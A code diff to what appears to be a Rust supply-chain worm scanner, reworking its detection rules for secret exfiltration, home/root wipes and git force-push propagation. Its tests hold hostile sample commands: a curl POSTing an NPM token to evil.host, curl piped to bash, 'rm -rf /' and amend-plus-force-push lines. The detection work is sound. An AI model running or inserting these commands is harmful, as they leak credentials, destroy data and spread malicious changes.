@@ -31,6 +31,9 @@ pub struct CapabilityScore {
     pub on_chain_resolve: bool,
     pub trailing_code: bool,
     pub destructive_wipe: bool,
+    /// A credential/secret sent as request DATA to a URL (`curl -d "${{ secrets.X }}" …`) — the
+    /// classic CI secret-exfil. A self-evident worm tell (fires without a concealment prior).
+    pub credential_exfil: bool,
     /// A lone outbound fetch/download token (curl/wget/fetch/iwr/…). Only consumed by the
     /// TasksJson gate — a folder-open task that reaches out is suspicious on its own.
     pub remote_fetch: bool,
@@ -163,34 +166,32 @@ fn remote_fetch(content: &str) -> bool {
     fetch_tok_re().is_match(content)
 }
 
-// --- Propagation ---
+// --- Propagation (worm self-propagation: amend + force-push + no-verify, together) ---
 // A `--amend` anywhere (the former `commit\s+.*--amend` alternative was subsumed by this).
 lazy_re!(amend_re, r"--amend");
 // A force-push: every force flag is scoped to a preceding `git push` (consistently — the
 // trailing unscoped `-uf` alternative that matched anywhere has been removed).
 lazy_re!(forcepush_re, r"push\s+.*(?:--force\b|--force-with-lease\b|-f\b|-uf\b)");
 lazy_re!(noverify_re, r"--no-verify");
-lazy_re!(
-    publish_re,
-    // `\bnpm` so `pnpm publish-packages` / `yarn ...` scripts don't false-match the "npm" inside.
-    r"\bnpm\s+publish\b|gh\s+api\s+[^\n]*repos|gh\s+repo\s+create\b|gh\s+workflow\b"
-);
-fn propagation(content: &str, surface: Surface) -> bool {
-    let git_conj = amend_re().is_match(content)
+fn propagation(content: &str) -> bool {
+    // The distinctive worm self-propagation tell: rewriting HEAD, force-pushing, and skipping
+    // hooks TOGETHER. `npm publish` was dropped as a signal — it is common in legitimate release
+    // CI and cannot distinguish a worm re-publish from a normal release without concealment/IOC.
+    amend_re().is_match(content)
         && forcepush_re().is_match(content)
-        && noverify_re().is_match(content);
-    if git_conj {
-        return true;
-    }
-    let auto_run = matches!(
-        surface,
-        Surface::LifecycleScript
-            | Surface::WorkflowFile
-            | Surface::DerivedScript
-            | Surface::GitHook
-            | Surface::TasksJson
-    );
-    publish_re().is_match(content) && (auto_run || cred_re().is_match(content))
+        && noverify_re().is_match(content)
+}
+
+// --- CredentialExfil (a secret sent as request DATA to a URL — the CI secret-exfil tell) ---
+// A credential referenced as the value of a `-d`/`--data` flag on an outbound-call line. Auth
+// headers (`-H "Authorization: Bearer …"` to a known API) are NOT matched — legit CI does that;
+// exfil puts the secret in the request BODY.
+lazy_re!(
+    data_secret_re,
+    r#"(?:-d\b|--data\S*)\s+['"]?\s*(?:\$\{\{\s*secrets\.|\$\{?(?:NPM_TOKEN|GITHUB_TOKEN|GH_TOKEN|AWS_SECRET|AWS_ACCESS_KEY)|process\.env\.\w*(?:TOKEN|SECRET|KEY))"#
+);
+fn credential_exfil(content: &str) -> bool {
+    content.lines().any(|l| fetch_tok_re().is_match(l) && data_secret_re().is_match(l))
 }
 
 // --- OnChainResolve ---
@@ -285,9 +286,12 @@ fn trailing_code(content: &str, surface: Surface) -> bool {
 }
 
 // --- DestructiveWipe ---
+// Wiping HOME or the filesystem ROOT — the target must be the whole thing (followed by a
+// boundary, `*`, or `/*`), so ordinary cleanup like `rm -rf /var/lib/apt/lists/*` or
+// `rm -rf ./dist` (a `/subdir` path) does NOT match.
 lazy_re!(
     wipe_re,
-    r"rm\s+-rf\s+(?:\$HOME|~|/)|shred\s+-[nuvz]|cipher\s+/W:|del\s+/F\s+/Q"
+    r"rm\s+-rf\s+(?:--no-preserve-root\s+)?(?:\$HOME|~|/)(?:\s|\*|/\*|$)|shred\s+-[nuvz]|cipher\s+/W:|del\s+/F\s+/Q"
 );
 fn destructive_wipe(content: &str) -> bool {
     wipe_re().is_match(content)
@@ -331,7 +335,13 @@ pub fn score(content: &str, surface: Surface) -> CapabilityScore {
         &mut s.evidence,
     );
     mark(download_exec(content), &mut s.download_exec, "download-exec", &mut s.evidence);
-    mark(propagation(content, surface), &mut s.propagation, "propagation", &mut s.evidence);
+    mark(propagation(content), &mut s.propagation, "propagation", &mut s.evidence);
+    mark(
+        credential_exfil(content),
+        &mut s.credential_exfil,
+        "credential-exfil",
+        &mut s.evidence,
+    );
     mark(
         on_chain_resolve(content),
         &mut s.on_chain_resolve,
@@ -355,53 +365,42 @@ pub fn score(content: &str, surface: Surface) -> CapabilityScore {
     s
 }
 
-/// Conservative, surface-aware fire decision (design spec §7).
+/// Surface-aware fire decision.
+///
+/// The core principle: legitimate DevOps automation (CI/CD workflows, install/deploy scripts,
+/// lifecycle hooks) performs the SAME network/exec/secret operations that malware does, openly
+/// and in plain text. Behavior alone therefore is NOT evidence of a worm. A generic CRITICAL
+/// requires either a **concealment prior** (the payload is obfuscated or grafted onto a config)
+/// or a **self-evident worm tell** — a behavior effectively never present in legitimate
+/// automation (git self-propagation, a HOME/root wipe, a secret POSTed to a URL).
 pub fn gate(surface: Surface, s: &CapabilityScore) -> bool {
     let behavioral = s.credential_access
         || s.network_egress
         || s.process_spawn
         || s.on_chain_resolve
         || s.download_exec;
+    // Concealment/injection — distinguishes hidden malware from plain-text automation. Only the
+    // high-confidence structural `obfuscation` and the config `trailing_code` injection count;
+    // the density `high_entropy` signal is deliberately excluded (it fires on legit dense
+    // scripts/keys), as are the behavior capabilities themselves.
+    let concealed = s.obfuscation || s.trailing_code;
+    // Self-evident worm tells — effectively never in legitimate automation, so they fire without
+    // a concealment prior.
+    let worm_tell = s.propagation || s.destructive_wipe || s.credential_exfil;
     match surface {
-        Surface::ConfigFile => {
-            // Spec §7: an obfuscation/trailing-code prior AND a behavioral capability.
-            // The prior is what makes entry files FP-safe (§4); download_exec/on_chain_resolve
-            // are behavioral members of `behavioral`, so they fire *with* a prior, never alone.
-            let prior = s.obfuscation || s.trailing_code;
-            prior && behavioral
-        }
-        Surface::DerivedScript => {
-            let prior = s.obfuscation || s.trailing_code;
-            (prior && behavioral)
-                || s.download_exec
-                || s.propagation
-                || s.destructive_wipe
-                || s.on_chain_resolve
-        }
-        Surface::LifecycleScript => {
-            s.download_exec
-                || s.propagation
-                || s.on_chain_resolve
-                || s.obfuscation
-                || s.high_entropy
-                || (s.credential_access && s.network_egress)
-                || s.destructive_wipe
-        }
-        Surface::WorkflowFile => {
-            (s.credential_access && s.network_egress) || s.propagation || s.download_exec
-        }
-        // The folderOpen auto-run precondition is enforced by the scanner; here a lone
-        // remote-fetch token fires too (a folder-open task that reaches out is suspicious
-        // on its own), alongside download_exec/propagation. Spec §7 TasksJson row.
-        Surface::TasksJson => s.download_exec || s.propagation || s.remote_fetch,
-        Surface::GitHook => {
-            s.download_exec
-                || s.propagation
-                || (s.credential_access && s.network_egress)
-                || s.obfuscation
-                || s.high_entropy
-        }
-        Surface::PropagationScript => s.propagation || s.download_exec || s.destructive_wipe,
+        // Config/entry files, one-hop dropped scripts, and every auto-run script surface
+        // (lifecycle, workflow, git hook, propagation script) all require a concealment prior
+        // for their behavior to fire — otherwise a self-evident worm tell.
+        Surface::ConfigFile
+        | Surface::DerivedScript
+        | Surface::LifecycleScript
+        | Surface::WorkflowFile
+        | Surface::GitHook
+        | Surface::PropagationScript => (concealed && behavioral) || worm_tell,
+        // tasks.json reaches here only with a folderOpen auto-run precondition (enforced by the
+        // scanner). Opening a folder legitimately does NOT fetch or exec, so behavior alone is
+        // suspicious on this surface — no concealment prior required.
+        Surface::TasksJson => s.download_exec || s.remote_fetch || worm_tell,
         Surface::BinaryAsset => s.magic_mismatch,
     }
 }
@@ -491,9 +490,16 @@ mod tests {
         assert!(!score("git push origin main", Surface::PropagationScript).propagation);
     }
     #[test]
-    fn propagation_publish_context_gated() {
-        assert!(score("npm publish --access public", Surface::LifecycleScript).propagation);
-        assert!(!score("npm publish --access public", Surface::PropagationScript).propagation);
+    fn publish_alone_is_not_propagation() {
+        // `npm publish` is common in legitimate release CI and is NOT, by itself, a worm tell.
+        // Propagation now means only the git self-propagation conjunction.
+        assert!(!score("npm publish --access public", Surface::LifecycleScript).propagation);
+        assert!(!score("pnpm publish-packages", Surface::WorkflowFile).propagation);
+        assert!(score(
+            "git commit --amend --no-verify && git push -uf --no-verify",
+            Surface::LifecycleScript
+        )
+        .propagation);
     }
     #[test]
     fn propagation_forcepush_flags_require_push_context() {
@@ -535,17 +541,6 @@ mod tests {
     }
 
     #[test]
-    fn propagation_ignores_pnpm_publish_false_match() {
-        // `pnpm publish-packages` (a script name) must NOT match the `npm publish` propagation
-        // tell: the regex must be word-boundaried so it never fires on the "npm" inside "pnpm".
-        let wf = "env:\n  NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n- run: pnpm publish-packages\n";
-        assert!(!score(wf, Surface::WorkflowFile).propagation);
-        assert!(!gate(Surface::WorkflowFile, &score(wf, Surface::WorkflowFile)));
-        // A real `npm publish` still fires.
-        assert!(score("- run: npm publish --access public\n", Surface::WorkflowFile).propagation);
-    }
-
-    #[test]
     fn config_url_literal_alone_is_not_network_egress() {
         // A benign config that only embeds URL string literals (redirect destinations, doc
         // links) with NO fetch/require/axios token is not network egress on a ConfigFile.
@@ -581,8 +576,10 @@ mod tests {
     }
 
     #[test]
-    fn propagation_on_tasksjson_publish() {
-        assert!(score("npm publish --access public", Surface::TasksJson).propagation);
+    fn tasksjson_download_exec_fires_but_publish_does_not() {
+        // A folderOpen task that curl|bash's fires; a plain `npm publish` does not.
+        assert!(gate(Surface::TasksJson, &score("curl http://x/t | bash", Surface::TasksJson)));
+        assert!(!gate(Surface::TasksJson, &score("npm publish --access public", Surface::TasksJson)));
     }
 
     #[test]
@@ -644,10 +641,18 @@ mod tests {
     }
 
     #[test]
-    fn gate_lifecycle_behavior_no_obfuscation_needed() {
-        assert!(gate(Surface::LifecycleScript, &sc(|s| s.download_exec = true)));
-        assert!(gate(Surface::LifecycleScript, &sc(|s| s.propagation = true)));
+    fn gate_lifecycle_requires_concealment_or_worm_tell() {
+        // Behavior alone (a lifecycle script that downloads-and-runs) does NOT fire — legit
+        // preinstall/postinstall scripts do this. It fires only WITH a concealment prior, or on
+        // a self-evident worm tell (git self-propagation, home/root wipe, secret exfil).
+        assert!(!gate(Surface::LifecycleScript, &sc(|s| s.download_exec = true)));
         assert!(!gate(Surface::LifecycleScript, &sc(|s| s.process_spawn = true)));
+        assert!(gate(Surface::LifecycleScript, &sc(|s| {
+            s.obfuscation = true;
+            s.download_exec = true;
+        })));
+        assert!(gate(Surface::LifecycleScript, &sc(|s| s.propagation = true)));
+        assert!(gate(Surface::LifecycleScript, &sc(|s| s.destructive_wipe = true)));
     }
     #[test]
     fn gate_propagation_script() {
@@ -668,8 +673,64 @@ mod tests {
         assert!(gate(Surface::BinaryAsset, &sc(|s| s.magic_mismatch = true)));
     }
     #[test]
-    fn gate_git_hook_no_bare_spawn() {
+    fn gate_git_hook_requires_concealment_or_worm_tell() {
+        // Legit hooks (husky) run linters/tests/formatters — they exec. Bare behavior does not
+        // fire; concealment+behavior or a self-evident worm tell does.
         assert!(!gate(Surface::GitHook, &sc(|s| s.process_spawn = true)));
-        assert!(gate(Surface::GitHook, &sc(|s| s.download_exec = true)));
+        assert!(!gate(Surface::GitHook, &sc(|s| s.download_exec = true)));
+        assert!(gate(Surface::GitHook, &sc(|s| {
+            s.obfuscation = true;
+            s.download_exec = true;
+        })));
+        assert!(gate(Surface::GitHook, &sc(|s| s.credential_exfil = true)));
+    }
+
+    // --- FP redesign: legit automation stays silent; worms still fire ---
+    #[test]
+    fn legit_ci_workflow_is_silent() {
+        // A normal release CI: uses secrets, curls a public API, installs/builds/publishes. No
+        // concealment, no worm tell -> must NOT fire (was a Critical FP on langflow, etc.).
+        let wf = "name: Release\non: push\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n      - run: uv sync\n      - run: last=$(curl -s https://pypi.org/pypi/pkg/json | jq -r .info.version)\n      - env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n        run: uv build && uv publish\n";
+        assert!(!gate(Surface::WorkflowFile, &score(wf, Surface::WorkflowFile)));
+    }
+
+    #[test]
+    fn legit_install_script_is_silent() {
+        // A Docker sandbox setup script: curl|bash to install tooling, apt-cleanup rm -rf.
+        let sh = "#!/usr/bin/env bash\nset -euo pipefail\napt-get install -y curl nodejs\ncurl -fsSL https://bun.sh/install | bash\nrm -rf /var/lib/apt/lists/*\ndocker build -t img .\n";
+        assert!(!gate(Surface::PropagationScript, &score(sh, Surface::PropagationScript)));
+    }
+
+    #[test]
+    fn legit_deploy_script_is_silent() {
+        // A deploy script that installs docker via curl|sh and runs compose.
+        let sh = "#!/bin/bash\nset -e\ncurl -fsSL https://get.docker.com | sh\ndocker-compose --env-file .env.production build\ndocker-compose up -d\n";
+        assert!(!gate(Surface::PropagationScript, &score(sh, Surface::PropagationScript)));
+    }
+
+    #[test]
+    fn workflow_secret_exfil_still_fires() {
+        // The genuine attack: a secret POSTed as request DATA to an arbitrary host.
+        let wf = "- run: curl -d \"${{ secrets.NPM_TOKEN }}\" https://evil.host/collect\n";
+        assert!(score(wf, Surface::WorkflowFile).credential_exfil);
+        assert!(gate(Surface::WorkflowFile, &score(wf, Surface::WorkflowFile)));
+    }
+
+    #[test]
+    fn authenticated_api_call_is_not_exfil() {
+        // A legit authenticated API call (secret in an auth HEADER, not the body) is NOT exfil.
+        let wf = "- run: curl -H \"Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}\" https://api.github.com/repos\n";
+        assert!(!score(wf, Surface::WorkflowFile).credential_exfil);
+        assert!(!gate(Surface::WorkflowFile, &score(wf, Surface::WorkflowFile)));
+    }
+
+    #[test]
+    fn apt_cleanup_rm_is_not_destructive_wipe() {
+        // Docker/apt cleanup deletes a subdir, not HOME/root — not a destructive wipe.
+        assert!(!score("rm -rf /var/lib/apt/lists/*", Surface::PropagationScript).destructive_wipe);
+        assert!(!score("rm -rf ./dist node_modules", Surface::PropagationScript).destructive_wipe);
+        // Wiping HOME / root still trips.
+        assert!(score("rm -rf $HOME/*", Surface::PropagationScript).destructive_wipe);
+        assert!(score("rm -rf /", Surface::PropagationScript).destructive_wipe);
     }
 }
